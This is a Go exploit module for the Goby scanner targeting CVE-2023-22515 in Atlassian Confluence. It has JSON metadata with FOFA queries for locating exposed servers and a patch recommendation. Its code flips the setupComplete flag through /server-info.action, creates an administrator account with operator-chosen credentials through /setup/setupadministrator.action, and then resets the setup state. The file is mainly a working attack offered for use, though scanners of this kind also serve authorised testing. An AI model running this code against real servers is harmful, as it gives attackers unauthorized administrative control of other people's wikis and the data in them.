package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Atlassian Confluence permission bypass vulnerability (CVE-2023-22515)",
    "Description": "<p>Atlassian Confluence is a software developed by Atlassian based on the online enterprise wiki (collaboration software).</p><p>A vulnerability exists in the Atlassian Confluence data center and server. The /server-info.action endpoint is used to pass the bootstrapStatusProvider.applicationConfig.setupComplete parameter, leaving the server in an incomplete state to access restricted endpoints and create unauthorized Confluence administrator accounts. Log in to the Confluence instance backend.</p>",
    "Product": "ATLASSIAN-Confluence",
    "Homepage": "https://www.atlassian.com/",
    "DisclosureDate": "2023-10-04",
    "PostTime": "2023-10-11",
    "Author": "m0x0is3ry@foxmail.com",
    "FofaQuery": "header=\"Confluence\" || banner=\"Confluence\" || body=\"confluence-base-url\" || body=\"com-atlassian-confluence\" ||  title=\"Atlassian Confluence\" || (title==\"Errors\" && body=\"Confluence\")",
    "GobyQuery": "header=\"Confluence\" || banner=\"Confluence\" || body=\"confluence-base-url\" || body=\"com-atlassian-confluence\" ||  title=\"Atlassian Confluence\" || (title==\"Errors\" && body=\"Confluence\")",
    "Level": "3",
    "Impact": "<p>A vulnerability exists in the Atlassian Confluence data center and server. The /server-info.action endpoint is used to pass the bootstrapStatusProvider.applicationConfig.setupComplete parameter, leaving the server in an incomplete state to access restricted endpoints and create unauthorized Confluence administrator accounts. Log in to the Confluence instance backend.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html\">https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "username",
            "type": "input",
            "value": "xxx",
            "show": ""
        },
        {
            "name": "email",
            "type": "input",
            "value": "xxx@localhost",
            "show": ""
        },
        {
            "name": "password",
            "type": "input",
            "value": "xxx",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2023-22515"
    ],
    "CNNVD": [
        "CNNVD-202310-278"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "Atlassian Confluence 权限绕过漏洞（CVE-2023-22515）",
            "Product": "ATLASSIAN-Confluence",
            "Description": "<p>Atlassian Confluence 是 Atlassian 开发的一款建基于网络企业维基 (collaboration software) 的软件。<br></p><p>Atlassian Confluence 数据中心和服务器存在漏洞，利用 /server-info.action 端点传递 bootstrapStatusProvider.applicationConfig.setupComplete 参数，使服务器处于安装未完成状态，以访问受限制的端点并创建未经授权的 Confluence 管理员帐户，登录 Confluence 实例后台。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html\">https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html</a></p>",
            "Impact": "<p>Atlassian Confluence 数据中心和服务器存在漏洞，利用 /server-info.action 端点传递 bootstrapStatusProvider.applicationConfig.setupComplete 参数，使服务器处于安装未完成状态，以访问受限制的端点并创建未经授权的 Confluence 管理员帐户，登录 Confluence 实例后台。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Atlassian Confluence permission bypass vulnerability (CVE-2023-22515)",
            "Product": "ATLASSIAN-Confluence",
            "Description": "<p>Atlassian Confluence is a software developed by Atlassian based on the online enterprise wiki (collaboration software).</p><p>A vulnerability exists in the Atlassian Confluence data center and server. The /server-info.action endpoint is used to pass the bootstrapStatusProvider.applicationConfig.setupComplete parameter, leaving the server in an incomplete state to access restricted endpoints and create unauthorized Confluence administrator accounts. Log in to the Confluence instance backend.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html\">https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html</a></p>",
            "Impact": "<p>A vulnerability exists in the Atlassian Confluence data center and server. The /server-info.action endpoint is used to pass the bootstrapStatusProvider.applicationConfig.setupComplete parameter, leaving the server in an incomplete state to access restricted endpoints and create unauthorized Confluence administrator accounts. Log in to the Confluence instance backend.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10846"
}`

	sendPayload2b23e1dd := func(hostInfo *httpclient.FixUrl, username, email, password string) (*httpclient.HttpResponse, error) {
		fullName := username
		cfgSetupCompleteFalse := httpclient.NewPostRequestConfig("/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false")
		cfgSetupCompleteFalse.VerifyTls = false
		cfgSetupCompleteFalse.FollowRedirect = false
		rsp, err := httpclient.DoHttpRequest(hostInfo, cfgSetupCompleteFalse)
		if err != nil || !(rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, "success") || rsp.StatusCode == 302 && strings.Contains(rsp.Header.Get("Location"), "selectsetupstep.action")) {
			return nil, err
		} else {
			cfgSetupAdministrator := httpclient.NewPostRequestConfig("/setup/setupadministrator.action")
			cfgSetupAdministrator.VerifyTls = false
			cfgSetupAdministrator.FollowRedirect = false
			cfgSetupAdministrator.Header.Store("X-Atlassian-Token", "no-check")
			cfgSetupAdministrator.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgSetupAdministrator.Data = "username=" + url.QueryEscape(username) + "&fullName=" + url.QueryEscape(fullName) + "&email=" + url.QueryEscape(email) + "&password=" + url.QueryEscape(password) + "&confirm=" + url.QueryEscape(password) + "&setup-next-button=Next"
			return httpclient.DoHttpRequest(hostInfo, cfgSetupAdministrator)
		}
	}

	// 重置安装状态
	sendPayloadSetupReset57d79d9f := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		cfgFinishSetup := httpclient.NewPostRequestConfig("/setup/finishsetup.action")
		cfgFinishSetup.VerifyTls = false
		cfgFinishSetup.FollowRedirect = false
		cfgFinishSetup.Header.Store("X-Atlassian-Token", "no-check")
		cfgFinishSetup.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		return httpclient.DoHttpRequest(hostInfo, cfgFinishSetup)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, _ := sendPayload2b23e1dd(u, "xxx", "xxx", "xxx")
			defer sendPayloadSetupReset57d79d9f(u)
			return rsp != nil && strings.Contains(rsp.Utf8Html, "Configure System Administrator Account") && strings.Contains(rsp.Utf8Html, "must enter a valid email address")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			email := goutils.B2S(ss.Params["email"])
			username := goutils.B2S(ss.Params["username"])
			password := goutils.B2S(ss.Params["password"])
			rsp, err := sendPayload2b23e1dd(expResult.HostInfo, username, email, password)
			defer sendPayloadSetupReset57d79d9f(expResult.HostInfo)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
			} else if rsp.StatusCode == 302 {
				expResult.Success = true
				expResult.Output = "username: " + username + "\n" + "password: " + password
			} else {
				expResult.Success = false
				expResult.Output = "漏洞利用失败，请注意用户名是否重复或服务器错误"
			}
			return expResult
		},
	))
}
